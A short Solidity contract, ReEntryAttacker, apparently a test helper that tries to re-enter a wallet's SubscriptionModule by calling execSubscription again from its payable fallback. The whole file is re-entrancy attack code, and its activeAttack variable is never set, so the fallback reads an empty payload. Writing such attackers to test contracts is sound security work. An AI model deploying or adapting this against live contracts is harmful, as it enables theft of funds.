pragma solidity ^0.5.0;

import "./common/Enum.sol";
import "./modules/SubscriptionModule.sol";

contract ReEntryAttacker {

    struct Payload {
        address to;
        uint256 value;
        bytes data;
        uint256 period;
        uint256 offChainId;
        uint256 startDate;
        uint256 endDate;
        bytes signatures;
    }

    address payable subModule;

    bytes32 activeAttack;

    mapping(bytes32 => Payload) public payloads;

    constructor(
        address payable _subModuleAddr
    )
    public
    {
        subModule = _subModuleAddr;
    }

    function attack(
        address payable to,
        uint256 value,
        bytes memory data,
        uint256 period,
        uint256 offChainId,
        uint256 startDate,
        uint256 endDate,
        bytes memory signatures
    )
    public
    {
        bytes32 _activeAttack = SubscriptionModule(subModule)
        .getSubscriptionHash(
            to,
            value,
            data,
            period,
            offChainId,
            startDate,
            endDate
        );

        payloads[_activeAttack] = Payload(
            to,
            value,
            data,
            period,
            offChainId,
            startDate,
            endDate,
            signatures
        );

        SubscriptionModule(subModule)
        .execSubscription(
            to,
            value,
            data,
            period,
            offChainId,
            startDate,
            endDate,
            signatures
        );
    }

    function()
    external
    payable {

        Payload storage _attack = payloads[activeAttack];

        SubscriptionModule(subModule)
        .execSubscription(
            _attack.to,
            _attack.value,
            _attack.data,
            _attack.period,
            _attack.offChainId,
            _attack.startDate,
            _attack.endDate,
            _attack.signatures
        );
    }
}
